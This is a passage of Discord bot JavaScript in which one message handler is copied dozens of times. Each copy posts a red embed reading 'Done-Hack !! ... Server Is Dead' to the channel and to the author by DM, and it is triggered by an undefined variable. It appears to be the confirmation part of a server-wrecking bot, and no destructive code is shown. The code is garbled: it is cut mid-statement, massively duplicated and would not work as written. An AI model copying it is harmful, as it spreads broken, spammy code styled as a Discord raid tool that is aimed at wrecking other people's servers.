   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
